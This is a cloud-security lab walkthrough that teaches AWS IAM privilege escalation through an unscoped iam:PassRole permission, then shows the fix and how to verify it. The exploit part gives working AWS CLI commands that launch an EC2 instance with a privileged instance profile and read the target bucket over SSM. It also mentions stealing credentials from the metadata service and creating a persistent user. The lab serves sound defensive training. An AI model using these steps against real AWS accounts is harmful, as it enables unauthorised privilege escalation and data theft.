## Scenario 3: PassRole + EC2 — New PassRole via Missing `iam:PassedToService` Condition

**Category:** New PassRole
**Starting Identity:** `iamws-ci-runner-user`
**Target:** Crown jewels via EC2 instance launched with `iamws-prod-deploy-profile`

**The Vulnerability:** `iamws-ci-runner-user` has `iam:PassRole` intended for Lambda deployments, but the permission has `Resource: "*"` and no `iam:PassedToService` condition. Without this condition, PassRole works for any AWS service — including EC2 — and any role, including privileged ones.

**Real-world scenario:** A CI/CD pipeline user needs `iam:PassRole` to deploy Lambda functions and has separate EC2 permissions for build infrastructure. Without `iam:PassedToService`, PassRole isn't scoped to Lambda — it works for all services. The attacker exploits this gap by passing a privileged role to EC2 instead.

> [!NOTE]
> **EC2 + PassRole primer:** An EC2 *instance profile* is the mechanism for attaching an IAM role to a virtual machine. The instance retrieves temporary credentials for that role from the metadata service (`169.254.169.254`), so any workload running on the instance can call AWS APIs as that role. `iam:PassRole` is the gatekeeper that controls which roles a user can hand off to AWS services like EC2 and Lambda.

### Part A: Identify with iam-recon

Build or refresh your iam-recon graph:

```bash
iam-recon graph create --profile taractf
```

Run the privilege escalation preset — this scenario's EC2 edge IS visible here:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc
```

Expected output (relevant excerpt):
```
──────────────────────────────
  Privilege Escalation Paths
──────────────────────────────

  >>> user/iamws-ci-runner-user can escalate to admin:
    user/iamws-ci-runner-user -> EC2 role/iamws-prod-deploy-role
```

The `EC2` edge flags that `iamws-ci-runner-user` can pass a privileged role to an EC2 instance.

Confirm the specific permission:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-ci-runner-user \
  --action iam:PassRole
```

Expected output:
```
ALLOW user/iamws-ci-runner-user can call iam:PassRole with *
```

Cross-reference with pathfinding.cloud:

```bash
iam-recon --account $ACCOUNT_ID pathfinding
```

Look for the `[ec2-001]` entry:
```
[ec2-001] user/iamws-ci-runner-user (new-passrole)
    Path: iam:PassRole + ec2:RunInstances
    Perms: iam:PassRole, ec2:RunInstances
    https://www.pathfinding.cloud/paths/ec2-001
```

**In the interactive visualization:** search for `ci-runner-user`. The node is orange (Privesc). Click the **EC2** edge to the `iamws-prod-deploy-role` node — iam-recon displays the policy inline, showing the PassRole statement with `Resource: "*"` and no `Condition` block.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/ec2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect — the attacker doesn't directly become the role. They hand it to a compute service that exposes the credentials. The fix is scoping the handoff to the intended service.

### Part C: Exploit the Vulnerability

**Step 1: Try the crown jewels — you're denied**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-ci-runner-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 2: Inspect the vulnerable PassRole policy**

> [!NOTE]
> `iamws-ci-runner-user` does not have `iam:GetPolicyVersion` — this command must run as an admin (e.g., `taractf`). The policy contents are also shown in the slide.

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
  --version-id v1 --query 'PolicyVersion.Document' --output json \
  --profile taractf
```

Notice the PassRole statement has `Resource: "*"` and **no Condition block**. The missing condition is:
```json
"Condition": {"StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}}
```

**Step 3: Find a suitable AMI and subnet**

```bash
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text \
  --profile iamws-ci-runner-user)

SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=default-for-az,Values=true" \
  --query 'Subnets[0].SubnetId' --output text \
  --profile iamws-ci-runner-user)

echo "AMI: $AMI_ID  Subnet: $SUBNET_ID"
```

**Step 4: Launch EC2 with the privileged instance profile**

```bash
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id $AMI_ID --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --subnet-id $SUBNET_ID \
  --query 'Instances[0].InstanceId' --output text \
  --profile iamws-ci-runner-user)

echo "Launched: $INSTANCE_ID"
```

No error — unrestricted PassRole let us attach the privileged `iamws-prod-deploy-profile` to a new EC2 instance.

**Step 5: Wait for the SSM agent to register (~90 seconds)**

> [!NOTE]
> `iamws-ci-runner-user` lacks `ssm:DescribeInstanceInformation` — poll the agent status as `taractf`.

```bash
sleep 90
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
  --query 'InstanceInformationList[0].PingStatus' --output text \
  --profile taractf
```

Expected output: `Online`. If blank, wait a bit longer and retry.

**Step 6: Start an SSM session and claim the crown jewels**

This step is interactive — run it from your terminal:

```bash
aws ssm start-session --target $INSTANCE_ID \
  --profile iamws-ci-runner-user
```

Inside the session, run the following commands:

```bash
# Inside the SSM session:
aws sts get-caller-identity                        # shows iamws-prod-deploy-role
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
exit
```

The identity shows `iamws-prod-deploy-role` — the instance assumed the privileged role. The crown jewels are accessible from inside the instance.

> [!NOTE]
> A real attacker wouldn't stop here. They could exfiltrate the instance's temporary credentials via the metadata service at `169.254.169.254`, use them from any machine, or create a persistent IAM user — all without logging into the instance interactively.

### Part D: Apply the Defense

Run all defense steps as your admin identity.

**Step 1: Apply a scoped inline policy**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam put-user-policy \
  --user-name iamws-ci-runner-user \
  --policy-name SecurePassRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "AllowPassRoleToLambdaOnly",
        "Effect": "Allow",
        "Action": "iam:PassRole",
        "Resource": "arn:aws:iam::'${ACCOUNT_ID}':role/iamws-ci-runner-role",
        "Condition": {"StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}}
      },
      {
        "Sid": "AllowEC2Operations",
        "Effect": "Allow",
        "Action": ["ec2:RunInstances","ec2:DescribeInstances","ec2:DescribeImages",
                   "ec2:DescribeSecurityGroups","ec2:DescribeSubnets","ec2:DescribeKeyPairs"],
        "Resource": "*"
      }
    ]
  }'
```

Three restrictions now lock down PassRole — Action limited to `iam:PassRole`, Resource scoped to the CI runner's own role (not `*`), and Condition limited to `lambda.amazonaws.com`. All three must be satisfied.

**Step 2: Detach the overly-permissive managed policy**

```bash
aws iam detach-user-policy \
  --user-name iamws-ci-runner-user \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy 2>/dev/null || true
```

### Part E: Verify the Remediation

**Step 1: Confirm the attack path is blocked with simulate-principal-policy**

Legitimate path — pass own role to Lambda (should still work):

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-ci-runner-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
  --context-entries '[{"ContextKeyName":"iam:PassedToService","ContextKeyValues":["lambda.amazonaws.com"],"ContextKeyType":"string"}]' \
  --query 'EvaluationResults[0].EvalDecision'
```

Expected output: `"allowed"` — legitimate Lambda PassRole still works.

Attack path — pass privileged role to EC2 (should fail):

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-ci-runner-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::${ACCOUNT_ID}:role/iamws-prod-deploy-role \
  --context-entries '[{"ContextKeyName":"iam:PassedToService","ContextKeyValues":["ec2.amazonaws.com"],"ContextKeyType":"string"}]' \
  --query 'EvaluationResults[0].EvalDecision'
```

Expected output: `"implicitDeny"` — the EC2 PassRole path is blocked.

**Step 2: Confirm the crown jewels are still safe**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Verify with iam-recon**

Refresh the graph:

```bash
iam-recon graph create --profile taractf
iam-recon --account $ACCOUNT_ID argquery --preset privesc
```

The `user/iamws-ci-runner-user -> EC2 role/iamws-prod-deploy-role` line is gone. iam-recon's EC2 edge checker correctly evaluates `iam:PassedToService`.

Confirm the specific attack permission is denied:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-ci-runner-user \
  --action iam:PassRole \
  --resource 'arn:aws:iam::*:role/iamws-prod-deploy-role'
```

Expected output:
```
DENY user/iamws-ci-runner-user cannot call iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role
```

**In the interactive visualization:** search for `ci-runner-user`. The node is now blue (User). The EC2 edge to `iamws-prod-deploy-role` is gone. The `IDENTITY` panel lists `SecurePassRole` as the only policy.

![Post-defense PassRole visualization](.playwright-mcp/scenario-3-postdefense-viz.png)

### Going Further

The defense above scopes the **user's** permissions. The same-named **role** (`iamws-ci-runner-role`) still has the original `iamws-ci-runner-policy` attached — iam-recon's `argquery --preset privesc` still shows `role/iamws-ci-runner-role -> EC2 role/iamws-prod-deploy-role`.

To eliminate that edge too, apply the same fix to the role:

```bash
aws iam put-role-policy \
  --role-name iamws-ci-runner-role \
  --policy-name SecurePassRole \
  --policy-document '...'   # same document as above

aws iam detach-role-policy \
  --role-name iamws-ci-runner-role \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy
```

### What You Learned

- `iam:PassRole` controls which roles can be handed to AWS services like EC2 and Lambda — the missing `iam:PassedToService` condition is the root cause.
- Without the condition, PassRole isn't scoped to the intended service — it works for any service, enabling the EC2 attack path.
- Combine **condition keys** (`iam:PassedToService`) with **resource constraints** (specific role ARN) for defense-in-depth on PassRole.
- `aws iam simulate-principal-policy` with `context-entries` is the right tool for verifying condition-key-based defenses.
- Defenses applied to a user don't automatically apply to the same-named role — audit both principals.

### Cleanup

See [`cleanup.md`](cleanup.md) for revert steps before moving to the next scenario.

---

**Next:** [Scenario 4: Lambda UpdateFunctionCode](../scenario-4-lambda-updatefunctioncode/instructions.md) — Privilege escalation via existing PassRole
